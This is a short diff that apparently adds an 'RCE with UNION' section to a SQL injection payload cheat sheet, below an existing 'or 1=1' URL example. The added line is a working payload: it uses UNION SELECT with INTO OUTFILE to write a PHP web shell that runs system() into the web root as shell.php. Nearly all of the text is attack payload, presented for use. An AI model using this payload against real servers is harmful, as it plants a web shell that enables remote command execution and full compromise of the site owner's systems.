@@ -40,3 +40,7 @@ Apply in URL
 www.example.com/xxx.php?id=1 or 1=1
 ```
 
+## RCE with UNION
+```
+123' UNION SELECT '<?php echo system("ls -la /");?>','2','3','4','5' into outfile '/var/www/html/shell.php'#
+```
